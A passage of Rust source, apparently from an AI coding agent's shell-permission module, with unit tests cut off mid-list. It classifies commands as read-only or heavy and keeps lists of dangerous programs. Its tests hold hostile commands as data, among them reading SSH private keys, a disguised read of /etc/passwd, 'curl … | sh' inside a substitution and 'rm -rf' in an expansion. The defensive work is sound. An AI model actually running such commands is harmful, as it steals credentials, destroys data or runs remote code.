//! What kind of command a call is, beyond what the rules say (TUI1e): one that only reads — let through like a
//! `read_file` in every mode —, one heavy enough to be asked even in the `auto` mode, and how far the owner's "always"
//! for it reaches. Like the lexer this is deliberately narrow: a program that is not listed is no reader, an option it
//! does not know makes it none either. The sandbox stays the fence; this only decides what is worth a question.

use super::command::{Analysis, Part, base, is_wrapper, without_git_globals};

/// Programs that only read and print, whatever their options.
const READERS: [&str; 41] = [
    "ls",
    "cat",
    "head",
    "tail",
    "wc",
    "grep",
    "egrep",
    "fgrep",
    "pwd",
    "echo",
    "printf",
    "stat",
    "du",
    "df",
    "which",
    "whereis",
    "basename",
    "dirname",
    "realpath",
    "readlink",
    "cut",
    "tr",
    "diff",
    "cmp",
    "comm",
    "nl",
    "date",
    "whoami",
    "uname",
    "id",
    "true",
    "column",
    "rev",
    "fold",
    "paste",
    "expand",
    "md5",
    "shasum",
    "sha256sum",
    "md5sum",
    "cksum",
];

/// The readers `xargs` may run (#169): each reads and prints whatever words it is handed, since `xargs` adds the
/// words it reads to the command — a file named `-o out` must not become an option that writes. No `sort`, `find`,
/// `sed`, `git` or `date`: an option of theirs writes or sets something.
const XARGS_READERS: [&str; 21] = [
    "cat",
    "head",
    "tail",
    "wc",
    "grep",
    "egrep",
    "fgrep",
    "ls",
    "stat",
    "du",
    "md5",
    "shasum",
    "sha256sum",
    "md5sum",
    "cksum",
    "basename",
    "dirname",
    "realpath",
    "readlink",
    "echo",
    "nl",
];

/// `xargs`'s options that only split the input or limit a call (#169): alone, or (`-n`, `-L`, `-s`, `-P`, `-d`)
/// with a value of their own. Not `-I`/`-J`/`-i`/`--replace` (the input could become the program), `-a` (another
/// input), `-p`/`-o` (the terminal), nor anything unknown.
const XARGS_FLAGS: [&str; 9] = [
    "-0",
    "--null",
    "-r",
    "--no-run-if-empty",
    "-t",
    "--verbose",
    "-x",
    "--exit",
    "--",
];
const XARGS_WITH_VALUE: [&str; 5] = ["-n", "-L", "-s", "-P", "-d"];

/// The most calls `xargs -P` may run at once as a reader: `-P 0` would start as many as it can.
const XARGS_MOST_PARALLEL: u32 = 16;

/// `find`'s actions that run a program or write a file.
const FIND_ACTS: [&str; 9] = [
    "-exec", "-execdir", "-ok", "-okdir", "-delete", "-fprint", "-fprint0", "-fprintf", "-fls",
];

/// Git's sub-commands that only read.
const GIT_READS: [&str; 13] = [
    "status",
    "log",
    "diff",
    "show",
    "rev-parse",
    "ls-files",
    "blame",
    "describe",
    "shortlog",
    "grep",
    "ls-tree",
    "show-ref",
    "cat-file",
];

/// `git branch`'s options that only list.
const GIT_BRANCH_LISTS: [&str; 11] = [
    "-a",
    "-r",
    "-v",
    "-vv",
    "-l",
    "--list",
    "--all",
    "--remotes",
    "--show-current",
    "--merged",
    "--no-merged",
];

/// Programs whose second word picks what they do (`git push`, `cargo test`): the owner may allow that pair alone.
const WITH_SUBCOMMANDS: [&str; 22] = [
    "git", "cargo", "npm", "npx", "pnpm", "yarn", "uv", "pip", "pip3", "brew", "docker", "kubectl",
    "gh", "go", "make", "swift", "rustup", "poetry", "mix", "dotnet", "just", "bundle",
];

/// Programs heavy whatever their options: they change the system, not the project.
const HEAVY_PROGRAMS: [&str; 12] = [
    "dd",
    "diskutil",
    "shutdown",
    "reboot",
    "halt",
    "killall",
    "pkill",
    "launchctl",
    "crontab",
    "shred",
    "srm",
    "truncate",
];

/// Shell words before a part's program that open, continue or close a loop or a condition (`do wc -l "$f"`).
const SHELL_KEYWORDS: [&str; 9] = [
    "do", "done", "then", "else", "elif", "fi", "if", "while", "until",
];

/// Readers a word that expands may be handed to (T52): no option of theirs writes, runs a program or prints what the
/// terminal would obey — `echo -e`, `printf` and `date -s` are left out, as are those that read no file.
const EXPANDABLE: [&str; 29] = [
    "ls",
    "cat",
    "head",
    "tail",
    "wc",
    "grep",
    "egrep",
    "fgrep",
    "stat",
    "du",
    "basename",
    "dirname",
    "realpath",
    "readlink",
    "cut",
    "tr",
    "diff",
    "cmp",
    "comm",
    "nl",
    "column",
    "rev",
    "fold",
    "paste",
    "expand",
    "md5",
    "shasum",
    "sha256sum",
    "cksum",
];

/// Whether a second model may judge `analysis` at all (T52): a command that would be a reader but for a loop over
/// names in the folder — every program in it a listed reader, nothing written, nested, protected, hidden behind a
/// substitution, a here-document or a comment, nothing read by a path out of the folder. A `$` may only name a
/// loop's own variable (`$f`, never `$HOME`, `${…}` or `"$(…)"`), and the program it is handed to is one of
/// [`EXPANDABLE`]. So a judge that a command's text talked round lets a reader read the folder, never more.
pub fn judgeable(analysis: &Analysis) -> bool {
    /// The lexer's only reasons a judge may weigh: a loop or a condition around readers, and a variable in them.
    const WEIGHABLE: [&str; 2] = [
        "a compound command (if, for, while, …)",
        "a variable or other expansion",
    ];
    if !analysis.opaque.iter().all(|why| WEIGHABLE.contains(why))
        || !analysis.writes.is_empty()
        || !analysis.reads.is_empty()
        || !analysis.nested.is_empty()
        || analysis.may_name_protected()
    {
        return false;
    }
    let without_keywords = |words: &[String]| -> usize {
        words
            .iter()
            .take_while(|word| SHELL_KEYWORDS.contains(&word.as_str()))
            .count()
    };
    // The loops' variables first: only they may be expanded.
    let mut bound: Vec<&str> = Vec::new();
    for part in &analysis.parts {
        let words = &part.words[without_keywords(&part.words)..];
        if words.first().is_some_and(|word| word == "for")
            && let Some(name) = words.get(1)
        {
            bound.push(name.as_str());
        }
    }
    // A path out of the folder, an option, or a glob that may name a parent (`.*` matches `..` in some shells).
    let outside = |word: &str| {
        word.starts_with(['/', '~'])
            || word.contains(".*")
            || word.split('/').any(|step| step == "..")
    };
    // Every `$` a loop's own variable, written plainly: `$f`, nothing else.
    let plain_loop_variables = |word: &str| {
        !word.contains('`')
            && word.match_indices('$').all(|(at, _)| {
                let name: String = word[at + 1..]
                    .chars()
                    .take_while(|c| c.is_ascii_alphanumeric() || *c == '_')
                    .collect();
                !name.is_empty() && bound.contains(&name.as_str())
            })
    };
    let mut programs = 0;
    for part in &analysis.parts {
        if !part.assignments.is_empty() {
            return false;
        }
        let words = &part.words[without_keywords(&part.words)..];
        if words
            .iter()
            .any(|word| outside(word) || !plain_loop_variables(word))
        {
            return false;
        }
        // A loop's head, `for NAME in WORDS`: names in the folder, no variable, no option.
        if words.first().is_some_and(|word| word == "for") {
            let named = words.get(1).is_some_and(|name| {
                !name.is_empty() && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
            });
            if !named
                || words.get(2).is_none_or(|word| word != "in")
                || words[3..]
                    .iter()
                    .any(|word| word.starts_with('-') || word.contains('$'))
            {
                return false;
            }
            continue;
        }
        let Some(program) = words.first() else {
            continue;
        };
        let expands = words.iter().any(|word| word.contains(['$', '*', '?', '[']));
        if !(if expands {
            EXPANDABLE.contains(&program.as_str()) && reader(words)
        } else {
            reader(words)
        }) {
            return false;
        }
        programs += 1;
    }
    programs > 0
}

/// Whether every part of the command only reads: listed readers, no wrapper, no assignment, nothing written, nothing
/// the lexer could not read, no command handed to a shell.
pub fn reads_only(analysis: &Analysis) -> bool {
    !analysis.is_opaque()
        && !analysis.globs
        && analysis.writes.is_empty()
        && analysis.nested.is_empty()
        && !analysis.parts.is_empty()
        && analysis
            .parts
            .iter()
            .all(|part| part.assignments.is_empty() && reader(&part.words))
        && names_shown(analysis)
}

/// Whether every `xargs` reads only names the command shows (#169, security audit 2026-11-10): `xargs` turns what it
/// reads into the files its reader opens, which no rule and no folder check sees — so only after parts that list
/// names out of paths they show (`find`, `ls`, `fd`, `git ls-files`, a `sort` of them), never after a file's
/// contents or words a model typed (`cat list | xargs cat`, `echo /etc/x | xargs cat`).
fn names_shown(analysis: &Analysis) -> bool {
    analysis.parts.iter().enumerate().all(|(at, part)| {
        part.words.first().map(String::as_str) != Some("xargs")
            // A file redirected in (`xargs cat < list`) hands it its contents as names.
            || (analysis.reads.is_empty()
                && analysis.parts[..at].iter().all(|before| lists_names(&before.words)))
    })
}

/// Whether a part only lists names of the paths its words show, or sorts such names without naming a file — by an
/// allowlist of options (security audit 2026-11-10): an option that prints its own text (`find -printf`,
/// `git ls-files --format`), a link's target (`ls -l`, `find -ls`) or names out of a file (`sort --files0-from`,
/// `find -files0-from`) would hand `xargs` names nobody judged, and one that follows links lists past them.
fn lists_names(words: &[String]) -> bool {
    let Some((first, args)) = words.split_first() else {
        return false;
    };
    // A short-option cluster made of the letters given alone (`-1aR`).
    let letters = |arg: &str, allowed: &str| {
        arg.strip_prefix('-').is_some_and(|rest| {
            !rest.is_empty() && !rest.starts_with('-') && rest.chars().all(|c| allowed.contains(c))
        })
    };
    match first.as_str() {
        "find" => find_lists(args),
        "ls" => args
            .iter()
            .all(|arg| !arg.starts_with('-') || letters(arg, LS_LETTERS)),
        "git" => {
            args.first().map(String::as_str) == Some("ls-files")
                && args[1..]
                    .iter()
                    .all(|arg| !arg.starts_with('-') || LS_FILES_OPTIONS.contains(&arg.as_str()))
        }
        "sort" => args.iter().all(|arg| letters(arg, SORT_LETTERS)),
        _ => false,
    }
}

/// `ls`'s options that list names alone: no long listing (it shows a link's target), no following of links.
const LS_LETTERS: &str = "1aAdRF";
/// `sort`'s options for names on its input: no file named, no long option (`--files0-from`).
const SORT_LETTERS: &str = "zurnf";
/// `git ls-files`'s options that list names alone (no `--format`).
const LS_FILES_OPTIONS: [&str; 8] = [
    "-z",
    "-o",
    "-c",
    "-m",
    "--others",
    "--cached",
    "--modified",
    "--exclude-standard",
];
/// `find`'s tests that take a value, and those that stand alone, that only choose among the names it walks.
const FIND_WITH_VALUE: [&str; 9] = [
    "-type",
    "-name",
    "-iname",
    "-path",
    "-ipath",
    "-maxdepth",
    "-mindepth",
    "-newer",
    "-size",
];
const FIND_ALONE: [&str; 11] = [
    "-prune", "-empty", "-o", "-a", "-not", "!", "-or", "-and", "-print", "-print0", "-true",
];

/// `find` with start paths first, then only [`FIND_WITH_VALUE`] and [`FIND_ALONE`] (grouping too): no `-printf`,
/// `-ls`, `-files0-from`, nor `-L`/`-H`/`-follow`.
fn find_lists(args: &[String]) -> bool {
    let mut rest = args;
    while let Some(word) = rest.first() {
        if word.starts_with('-') || word == "!" || word == "(" {
            break;
        }
        rest = &rest[1..];
    }
    while let Some(word) = rest.first() {
        if FIND_WITH_VALUE.contains(&word.as_str()) {
            if rest.len() < 2 {
                return false;
            }
            rest = &rest[2..];
        } else if FIND_ALONE.contains(&word.as_str()) || word == "(" || word == ")" {
            rest = &rest[1..];
        } else {
            return false;
        }
    }
    true
}

/// Whether one part of a command (its words, assignments apart) only reads: a listed reader without a writing
/// option. What it redirects is the analysis' to say.
pub fn reader(words: &[String]) -> bool {
    let Some(first) = words.first() else {
        return false;
    };
    if first == "xargs" {
        return xargs_reads(&words[1..]);
    }
    // A program named by a path (`./cat`, `target/ls`) may be one the run just wrote: only the one `PATH` finds,
    // named exactly as listed, is a reader.
    if first.contains('/') || is_wrapper(first) {
        return false;
    }
    let name = first.as_str();
    let args = &words[1..];
    let has = |options: &[&str]| {
        args.iter().any(|arg| {
            options
                .iter()
                .any(|option| arg == option || arg.starts_with(&format!("{option}=")))
        })
    };
    // A short option inside a cluster (`-ao out`, `-Hx rm`).
    let clustered = |letters: &[char]| {
        args.iter().any(|arg| {
            arg.starts_with('-')
                && !arg.starts_with("--")
                && arg.chars().skip(1).any(|c| letters.contains(&c))
        })
    };
    match name {
        name if READERS.contains(&name) => true,
        "find" => !has(&FIND_ACTS),
        // `--pre` and `--hostname-bin` run a program.
        "rg" => !args
            .iter()
            .any(|arg| arg.starts_with("--pre") || arg.starts_with("--hostname-bin")),
        "fd" => !has(&["--exec", "--exec-batch"]) && !clustered(&['x', 'X']),
        // `-o` writes the sorted lines to a file; `--compress-program` runs one.
        "sort" => {
            !args
                .iter()
                // Abbreviations count: `--o` can only be `--output`, `--co` may be `--compress-program`.
                .any(|arg| arg.starts_with("--o") || arg.starts_with("--co"))
                && !clustered(&['o'])
        }
        // `-o` writes the listing to a file, `-R` with `-H` an HTML file into every folder.
        "tree" => !clustered(&['o', 'R']),
        // `-C` compiles a magic file and writes it.
        "file" => !clustered(&['C']) && !args.iter().any(|arg| arg.starts_with("--compile")),
        "sed" => sed_reads(args),
        "git" => git_reads(words),
        _ => false,
    }
}

/// `xargs` with options that only split its input, running one of [`XARGS_READERS`] by its plain name (#169):
/// `find . -type f -print0 | xargs -0 wc -l`.
fn xargs_reads(args: &[String]) -> bool {
    let mut rest = args;
    while let Some(word) = rest.first() {
        if XARGS_FLAGS.contains(&word.as_str()) {
            let end = word == "--";
            rest = &rest[1..];
            if end {
                break;
            }
        } else if XARGS_WITH_VALUE.contains(&word.as_str()) {
            let Some(value) = rest.get(1) else {
                return false;
            };
            // A count, or the delimiter: one character, an escape such as `\n`.
            let count = value.parse::<u32>().ok().filter(|count| *count > 0);
            let fits = match word.as_str() {
                "-d" => value.chars().count() <= 2,
                "-P" => count.is_some_and(|count| count <= XARGS_MOST_PARALLEL),
                _ => count.is_some(),
            };
            if !fits {
                return false;
            }
            rest = &rest[2..];
        } else if word.starts_with('-') {
            return false;
        } else {
            break;
        }
    }
    rest.first()
        .is_some_and(|program| XARGS_READERS.contains(&program.as_str()))
}

/// `sed -n` with scripts made of line numbers and `p` only (`sed -n 200,270p file`): anything else may write (`w`),
/// run (`e`) or edit in place (`-i`).
fn sed_reads(args: &[String]) -> bool {
    let mut quiet = false;
    let mut scripts: Vec<&str> = Vec::new();
    let mut given = false;
    let mut positional: Vec<&str> = Vec::new();
    let mut words = args.iter();
    while let Some(arg) = words.next() {
        match arg.as_str() {
            "-n" | "--quiet" | "--silent" => quiet = true,
            "-e" => match words.next() {
                Some(script) => {
                    scripts.push(script);
                    given = true;
                }
                None => return false,
            },
            option if option.starts_with('-') => return false,
            other => positional.push(other),
        }
    }
    if !given {
        match positional.first() {
            Some(script) => scripts.push(script),
            None => return false,
        }
    }
    quiet
        && scripts.iter().all(|script| {
            !script.is_empty()
                && script
                    .chars()
                    .all(|c| c.is_ascii_digit() || matches!(c, ',' | '$' | 'p' | ';' | ' '))
        })
}

fn git_reads(words: &[String]) -> bool {
    // A global option other than `-C` (another folder) and `--no-pager` may load another configuration or name a
    // program (`-c diff.external=…`, `--git-dir`, `--exec-path`): the call is no reader.
    let mut at = 1;
    while let Some(word) = words.get(at) {
        match word.as_str() {
            "-C" => at += 2,
            "--no-pager" | "-P" => at += 1,
            option if option.starts_with('-') => return false,
            _ => break,
        }
    }
    let Some(core) = without_git_globals(words) else {
        return false;
    };
    let Some(sub) = core.get(1) else {
        return false;
    };
    let args = &core[2..];
    // `--output` (or an abbreviation of it) writes the diff or log to a file; `--ext-diff` and `--textconv` run the
    // programs a configuration names.
    if args.iter().any(|arg| {
        // Every abbreviation git takes for `--output` starts so; `--oneline` does not.
        arg.starts_with("--ou") || arg.starts_with("--ext-diff") || arg.starts_with("--textconv")
    }) {
        return false;
    }
    // `git grep -O` opens the files found in a pager it names.
    if sub == "grep"
        && args
            .iter()
            .any(|arg| arg.starts_with("-O") || arg.starts_with("--open-files-in-pager"))
    {
        return false;
    }
    match sub.as_str() {
        sub if GIT_READS.contains(&sub) => true,
        "branch" => args
            .iter()
            .all(|arg| GIT_BRANCH_LISTS.contains(&arg.as_str())),
        "remote" => args.iter().all(|arg| arg == "-v" || arg == "--verbose"),
        "tag" => args.iter().all(|arg| arg == "-l" || arg == "--list"),
        "stash" => args.first().is_some_and(|arg| arg == "list"),
        _ => false,
    }
}

/// Why the command is heavy — asked even in the `auto` mode, where the owner trusts the rest: it deletes recursively
/// or by force, rewrites or publishes history, changes the system, or runs as another user.
pub fn heavy(analysis: &Analysis) -> Option<&'static str> {
    analysis
        .deny_candidates()
        .iter()
        .find_map(|words| heavy_words(words))
}

/// A heavy command inside text the lexer could not read (`$(echo x) rm -rf y`, `eval "git push"`): its plain words,
/// split at everything a shell separates on, searched for a program or sub-command that is heavy in any form.
pub fn heavy_in_text(command: &str) -> Option<&'static str> {
    let words: Vec<String> = command
        .split(|c: char| c.is_whitespace() || ";|&()`$\"'{}<>=".contains(c))
        .filter(|word| !word.is_empty())
        .map(|word| base(word).to_ascii_lowercase())
        .collect();
    let named = |names: &[&str]| words.iter().any(|word| names.contains(&word.as_str()));
    if named(&[
        "rm",
        "rmdir",
        "sudo",
        "doas",
        "dd",
        "shred",
        "srm",
        "killall",
        "pkill",
        "launchctl",
        "crontab",
    ]) {
        return Some("a command it hides may delete or change the system");
    }
    if named(&["git"])
        && named(&[
            "push",
            "reset",
            "clean",
            "rebase",
            "filter-branch",
            "update-ref",
        ])
    {
        return Some("a command it hides may rewrite or publish history");
    }
    None
}

/// What in a heavy command reaches past a confined folder (T61, [`crate::sandbox::Confinement`]): the sandbox holds
/// every write of an arena model's command to its own folder, so what stays heavy beyond it acts through another user,
/// the system, the network or a service — `sudo`, a system program, a publish, GitHub, `git push`. Text the lexer
/// could not read is searched for those words.
pub fn reaches_out(analysis: &Analysis, command: &str) -> Option<&'static str> {
    let named = analysis.deny_candidates().into_iter().find_map(|words| {
        let first = base(words.first()?).to_ascii_lowercase();
        let args = &words[1..];
        let has = |word: &str| args.iter().any(|arg| arg == word);
        match first.as_str() {
            "sudo" | "doas" => Some("it runs as another user"),
            name if name.starts_with("mkfs") || HEAVY_PROGRAMS.contains(&name) => {
                Some("it changes the system")
            }
            "npm" | "cargo" | "pnpm" | "yarn" | "gem" | "twine"
                if has("publish") || has("upload") =>
            {
                Some("it publishes a package")
            }
            "gh" => Some("it acts on GitHub"),
            "git" => without_git_globals(&words)
                .filter(|core| core.get(1).is_some_and(|sub| sub == "push"))
                .map(|_| "git push publishes"),
            _ => None,
        }
    });
    if named.is_some() || !analysis.is_opaque() {
        return named;
    }
    let words: Vec<String> = command
        .split(|c: char| c.is_whitespace() || ";|&()`$\"'{}<>=".contains(c))
        .filter(|word| !word.is_empty())
        .map(|word| base(word).to_ascii_lowercase())
        .collect();
    let named = |names: &[&str]| words.iter().any(|word| names.contains(&word.as_str()));
    let system = words
        .iter()
        .any(|word| word.starts_with("mkfs") || HEAVY_PROGRAMS.contains(&word.as_str()));
    if named(&["sudo", "doas"]) || system {
        Some("a command it hides may run as another user or change the system")
    } else if named(&["gh", "publish", "upload"]) || (named(&["git"]) && named(&["push"])) {
        Some("a command it hides may publish")
    } else {
        None
    }
}

fn heavy_words(words: &[String]) -> Option<&'static str> {
    let first = base(words.first()?).to_ascii_lowercase();
    let args = &words[1..];
    let flag = |long: &[&str], short: &[char]| {
        args.iter().any(|arg| {
            // GNU tools take a long option shortened as far as it is unique (`--rec` for `--recursive`).
            long.iter().any(|name| {
                arg == name
                    || (arg.len() > 3 && arg.starts_with("--") && name.starts_with(arg.as_str()))
            }) || (arg.starts_with('-')
                && !arg.starts_with("--")
                && arg.chars().skip(1).any(|c| short.contains(&c)))
        })
    };
    let has = |word: &str| args.iter().any(|arg| arg == word);
    match first.as_str() {
        "sudo" | "doas" => Some("it runs as another user"),
        // Recursive only (T73b): `-f` alone deletes what plain `rm` would, without asking — the sandbox and the
        // snapshots hold either way, and an unattended run refused it three times and ended (MiMo, `rm -f tally.txt`).
        "rm" if flag(&["--recursive"], &['r', 'R']) => Some("it deletes recursively"),
        "find" if has("-delete") => Some("it deletes what it finds"),
        "rsync"
            if args
                .iter()
                .any(|arg| arg.starts_with("--delete") || arg.starts_with("--remove")) =>
        {
            Some("it deletes what the source does not hold")
        }
        // `find -exec rm …`: the program it runs is no word sequence of its own for the checks above.
        "find"
            if args
                .iter()
                .any(|arg| base(arg) == "rm" || base(arg) == "rmdir") =>
        {
            Some("it deletes what it finds")
        }
        "chmod" | "chown" if flag(&["--recursive"], &['R']) => {
            Some("it changes rights recursively")
        }
        "npm" | "cargo" | "pnpm" | "yarn" | "gem" | "twine" if has("publish") || has("upload") => {
            Some("it publishes a package")
        }
        name if name.starts_with("mkfs") || HEAVY_PROGRAMS.contains(&name) => {
            Some("it changes the system")
        }
        "git" => heavy_git(words),
        "gh" if args
            .iter()
            .any(|arg| matches!(arg.as_str(), "delete" | "merge" | "release")) =>
        {
            Some("it changes the repository on GitHub")
        }
        _ => None,
    }
}

fn heavy_git(words: &[String]) -> Option<&'static str> {
    let core = without_git_globals(words)?;
    let sub = core.get(1)?.as_str();
    let args = &core[2..];
    let has = |options: &[&str]| args.iter().any(|arg| options.contains(&arg.as_str()));
    match sub {
        "push" => Some("git push publishes"),
        "reset" if has(&["--hard", "--merge", "--keep"]) => Some("git reset throws work away"),
        "clean" => Some("git clean deletes untracked files"),
        "rebase" | "filter-branch" | "filter-repo" | "update-ref" => Some("it rewrites history"),
        "branch" if has(&["-d", "-D", "--delete", "-f", "--force", "-M"]) => {
            Some("it deletes or replaces a branch")
        }
        "checkout" if has(&["-f", "--force", "--", "."]) => {
            Some("git checkout throws changes away")
        }
        "restore" if !has(&["--staged", "-S"]) => Some("git restore throws changes away"),
        "stash" if has(&["drop", "clear"]) => Some("it deletes stashed work"),
        "tag" if has(&["-d", "--delete"]) => Some("it deletes a tag"),
        "reflog" if has(&["expire", "delete"]) => Some("it deletes history"),
        "gc" if args.iter().any(|arg| arg.starts_with("--prune")) => Some("it deletes history"),
        _ => None,
    }
}

/// How far an allowance the owner gives for one part of a command reaches.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Reach {
    /// These words and nothing else.
    Exact(Vec<String>),
    /// Every command that starts with these words: the program and its sub-command (`git status *`), or the program
    /// (`git *`).
    Prefix(Vec<String>),
}

impl Reach {
    /// The rule's text (`Bash(git status:*)`, `Bash(rm a.txt)`).
    pub fn rule(&self) -> String {
        match self {
            Reach::Exact(words) => format!("Bash({})", words.join(" ")),
            Reach::Prefix(words) => format!("Bash({}:*)", words.join(" ")),
        }
    }

    /// How wide it is: 0 exactly the command, 1 a program and its sub-command, 2 a program.
    pub fn tier(&self) -> usize {
        match self {
            Reach::Exact(_) => 0,
            Reach::Prefix(words) if words.len() > 1 => 1,
            Reach::Prefix(_) => 2,
        }
    }

    /// As the owner reads it: `git status --short`, `git status *`.
    pub fn label(&self) -> String {
        match self {
            Reach::Exact(words) => words.join(" "),
            Reach::Prefix(words) => format!("{} *", words.join(" ")),
        }
    }
}

/// What the owner may allow for `part` from then on, narrowest first: exactly this, the program with its sub-command
/// (`git status *`, for programs that have them), the program (`git *`). Empty when its words cannot be written as a
/// rule (a space, a `*` inside a word) or it starts with a wrapper (`sudo`, `xargs`), which would reach every program
/// after it.
pub fn reaches(part: &Part) -> Vec<Reach> {
    let words = &part.words;
    let Some(first) = words.first() else {
        return Vec::new();
    };
    let writable = |word: &String| {
        !word.is_empty()
            && !word
                .chars()
                .any(|c| c.is_whitespace() || matches!(c, '*' | '(' | ')' | ':'))
    };
    if !writable(first) || is_wrapper(first) {
        return Vec::new();
    }
    // The exact scope needs every word written into the rule, a prefix only its own.
    let mut out = Vec::new();
    if words.iter().all(writable) {
        out.push(Reach::Exact(words.clone()));
    }
    let name = base(first);
    let with_sub = WITH_SUBCOMMANDS
        .iter()
        .any(|known| known.eq_ignore_ascii_case(name));
    if let Some(sub) = words
        .get(1)
        .filter(|sub| with_sub && !sub.starts_with('-') && writable(sub))
    {
        out.push(Reach::Prefix(vec![first.clone(), sub.clone()]));
    }
    if words.len() > 1 {
        out.push(Reach::Prefix(vec![first.clone()]));
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::permissions::command::analyze;

    #[test]
    fn readers_with_pipes_and_dev_null_only_read_and_a_writing_option_does_not() {
        for command in [
            "ls -la docs/",
            "grep -rn \"handoff\" docs/plans/glut-tui.md | head -20; echo \"=== in src ===\"",
            "ls -la docs/ && find . -maxdepth 3 -iname \"*handoff*\" -not -path \"./target/*\" 2>/dev/null",
            "sed -n 200,270p docs/plans/glut-tui.md",
            "git status --short && git log --oneline -5",
            "git -C crates diff HEAD~1 | wc -l",
            "git branch -a",
            "git -C crates --no-pager log --oneline",
            "find . -iname \"*handoff*\"",
            "rg -n todo crates",
            // #169: xargs running a reader that no handed word can turn into a writer.
            "find . -path ./.git -prune -o -type f -print0 | sort -z | xargs -0 wc -l",
            "find . -type f -print | xargs cat | wc -l",
            "ls src | xargs -n 1 wc -l",
            "ls -1aR src | xargs -n 1 wc -l",
            "find src \\( -name '*.py' -o -name '*.rs' \\) -not -path './target/*' -print0 | xargs -0 wc -l",
            "git ls-files -z --others --exclude-standard | sort -z | xargs -0 wc -l",
            "git ls-files | xargs -n 1 -P 4 grep -l todo",
            "find src -name '*.py' -print0 | xargs -0 -r -- head -3",
        ] {
            assert!(reads_only(&analyze(command)), "{command}");
        }
        for command in [
            "ls > list.txt",
            "find . -name x -delete",
            "find . -exec rm {} ;",
            "sed -i s/a/b/ f",
            "sed -n 1w out f",
            "sort -o out in",
            "git diff --output=x",
            "git push",
            "git branch -D old",
            "rg --pre=./run x",
            "cat $(which rm)",
            "xargs sort -o out",
            "xargs -I x grep x",
            "xargs -J x cat x",
            "xargs -a list cat",
            "xargs -p cat",
            "xargs sh -c ls",
            "xargs rm",
            "xargs ./cat",
            "xargs find . -delete",
            "xargs git diff",
            "xargs -n x cat",
            "xargs -0n1 cat",
            "xargs",
            "xargs cat > f",
            "xargs -P 0 cat",
            "xargs -n 0 cat",
            // Names out of a file's contents or typed words: no rule or folder check sees them (audit 2026-11-10).
            "cat list.txt | xargs cat",
            "echo xetcxpasswd | tr x '\\057' | xargs cat",
            "printf /etc/hosts | xargs cat",
            "sort list.txt | xargs cat",
            "find . -type f | grep secret | xargs cat",
            "xargs cat < list.txt",
            // Listers that print text of their own, a link's target or names out of a file (audit 2026-11-10).
            "find . -maxdepth 0 -printf '/etc/hosts\\n' | xargs cat",
            "find . -ls | xargs cat",
            "find -L . -type f | xargs cat",
            "find . -files0-from list | xargs cat",
            "fd --format /etc/hosts | xargs cat",
            "git ls-files --format=/etc/hosts | xargs cat",
            "sort --files0-from=data.list | xargs cat",
            "ls -l | xargs cat",
            "ls -L | xargs cat",
            "X=1 ls",
            "bash -c ls",
            "cargo test",
            "./cat a",
            "target/x/ls",
            "git -c diff.external=./x diff",
            "git --git-dir=evil status",
            "git diff --out=x",
            "git log --ext-diff -p",
            "git grep -Oless x",
            "sort --out=x a",
            "sort --compress-program=./x a",
            "tree -ao out",
            "fd -Hx rm",
            "rg --hostname-bin=./x y",
            "file -C -m magic",
            "jq -n env",
            "sed -n 1p *",
        ] {
            assert!(!reads_only(&analyze(command)), "{command}");
        }
    }

    #[test]
    fn a_heavy_command_hidden_in_text_the_lexer_cannot_read_is_found() {
        assert!(heavy_in_text("$(echo x) rm -rf y").is_some());
        assert!(heavy_in_text("eval \"git push origin\"").is_some());
        assert!(heavy_in_text("X=$(date) cargo build").is_none());
    }

    #[test]
    fn heavy_commands_are_named_and_ordinary_ones_are_not() {
        for command in [
            "rm -rf target",
            "rm -fr target",
            "rm --recursive --force target",
            "rm --rec target",
            "sudo ls",
            "git push origin main",
            "git -C . reset --hard HEAD",
            "git clean -fd",
            "git checkout -- src/a.rs",
            "git restore src/a.rs",
            "find . -delete",
            "cargo publish",
            "xargs rm -r",
            "bash -c \"rm -rf x\"",
            "killall Finder",
            "find . -exec rm -rf {} +",
            "rsync -a --delete a/ b/",
        ] {
            assert!(heavy(&analyze(command)).is_some(), "{command}");
        }
        for command in [
            "rm a.txt",
            "rm -f a.txt b.txt",
            "cargo test",
            "git commit -m x",
            "git restore --staged a",
            "git checkout main",
            "npm install",
            "mkdir -p x",
        ] {
            assert_eq!(heavy(&analyze(command)), None, "{command}");
        }
    }

    #[test]
    fn the_owner_may_allow_the_command_its_subcommand_or_its_program() {
        let labels = |command: &str| {
            reaches(&analyze(command).parts[0])
                .iter()
                .map(|reach| (reach.label(), reach.rule()))
                .collect::<Vec<_>>()
        };
        let pair = |label: &str, rule: &str| (label.to_owned(), rule.to_owned());
        assert_eq!(
            labels("git status --short"),
            [
                pair("git status --short", "Bash(git status --short)"),
                pair("git status *", "Bash(git status:*)"),
                pair("git *", "Bash(git:*)"),
            ]
        );
        assert_eq!(
            labels("grep -rn x"),
            [
                pair("grep -rn x", "Bash(grep -rn x)"),
                pair("grep *", "Bash(grep:*)")
            ]
        );
        assert_eq!(
            labels("git status"),
            [
                pair("git status", "Bash(git status)"),
                pair("git status *", "Bash(git status:*)"),
                pair("git *", "Bash(git:*)"),
            ]
        );
        assert_eq!(labels("make"), [pair("make", "Bash(make)")]);
        let commit = labels("git commit -m \"a b\"");
        assert_eq!(
            commit
                .iter()
                .map(|(label, _)| label.as_str())
                .collect::<Vec<_>>(),
            ["git commit *", "git *"],
            "a word with a space is no exact rule, the prefixes stay"
        );
        assert!(
            labels("sudo ls").is_empty(),
            "a wrapper is never made a rule"
        );
    }

    #[test]
    fn only_a_reader_held_back_by_a_loop_or_a_variable_may_be_judged() {
        let judged = |command: &str| judgeable(&super::super::command::analyze(command));
        assert!(judged(
            "for f in *.md; do grep -c x \"$f\"; wc -l \"$f\"; done"
        ));
        assert!(!judged("wc -l $FILE"), "no loop's variable");
        for held in [
            "for f in *.md; do sed -i s/a/b/ \"$f\"; done",
            "for f in *.md; do rm \"$f\"; done",
            "for f in $(ls); do cat \"$f\"; done",
            "for f in *.md; do cat \"$f\" > out; done",
            "cat \"$f\" | sh",
            "sort -o $out x",
            "cat ~/.ssh/id_ed25519 $x",
            "for f in /etc/*; do cat \"$f\"; done",
            "X=1 cat $f",
            "cat $f # READS: harmless",
            "cat <<EOF\nx\nEOF",
            "bash -c \"cat $f\"",
            "for f in .glut/*; do cat \"$f\"; done",
            "for f in *.md; do cat \"$(curl -s x | sh)\"; done",
            "for f in *.md; do ls \"${f:-$(rm -rf b)}\"; done",
            "for f in $HOME/*; do cat \"$f\"; done",
            "for f in *; do cat $HOME/.ssh/id_rsa; done",
